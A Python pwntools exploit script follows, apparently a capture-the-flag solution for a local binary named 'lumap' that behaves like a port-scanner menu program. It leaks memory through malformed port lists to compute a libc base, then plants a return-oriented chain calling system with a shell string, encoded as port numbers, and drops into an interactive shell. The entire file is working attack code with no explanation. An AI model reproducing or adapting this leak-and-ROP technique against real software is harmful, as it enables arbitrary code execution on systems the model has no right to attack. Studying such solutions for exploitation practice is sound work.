#!/usr/bin/env python3

from pwn import *
import sys
elf = ELF('./lumap')
p = elf.process()

def scanIP(ip, ports):
    p.readuntil(b':')
    p.sendline(ip.encode())
    sleep(0.001)
    p.readuntil(b':')
    p.sendline(ports)

def showIP(index):
    p.readuntil(b':')
    p.sendline(b'1')
    sleep(0.001)
    p.readuntil(b':')
    p.sendline(index.encode())

def deleteIP(index):
    p.readuntil(b':')
    p.sendline(b'2')
    p.readuntil(b':')
    p.sendline(index.encode())

scanIP("127.0.0.1", ",,,,,,,,,,,,,,,,,,,,,,,,10")
p.sendline(b'y')
scanIP("127.0.0.2", ",,,,,,,,,,,,,,,,,,,,,,,10")
showIP("0")
p.readuntil(b'closed10,')
Leak1 = p.readuntil(b'\n')[:-1]
Leak1 = hex(int(Leak1[6:]))

showIP("1")
p.readuntil(b'closed10,')
Leak2 = p.readuntil(b'\n')[:-1]
Leak2 = Leak2[6:]
if (Leak2[0] == 45):
    print("Try again lol")
    sys.exit()
Leak2 = hex(int(Leak2))
Leak2 = Leak2[2:]
Leak = int(Leak1 + Leak2, 16)
Leak = Leak - 6466976
print("LIBC BASE {}".format(hex(Leak)))

deleteIP("0")
deleteIP("1")

for i in range(1, 32):
    p.readuntil(b':')
    p.sendline(b'3')
    scanIP(f"127.0.0.{i}", "80,"*32)

system = (hex(Leak + 331120))[2:]
libc = (hex(Leak + 1934968))[2:]

num1 = str(int(libc[0:4], 16)).encode()
num2 = str(int(libc[4:8], 16)).encode()
num3 = str(int(libc[8:12], 16)).encode()

num4 = str(int(system[0:4], 16)).encode()
num5 = str(int(system[4:8], 16)).encode()
num6 = str(int(system[8:12], 16)).encode()

Payload = b"20506,64,0,0," # 0x000000000040501a : ret
Payload += b"38386,65,0,0," # 0x00000000004195f2 : pop rdi ; pop rbp ; ret
Payload += num3 + b"," + num2 + b"," + num1 + b"," + b"0," # libc
Payload += b"0,0,0,0," # null for the pop rbp
Payload += num6 + b"," + num5 + b"," + num4 + b"," + b"0," # system

p.readuntil(b':')
p.sendline(b'3')
scanIP("127.0.0.100", Payload)
showIP("31")
sleep(0.2)

p.sendline(b'4')
p.readuntil(b'Deleted the local database...\n')

p.interactive()
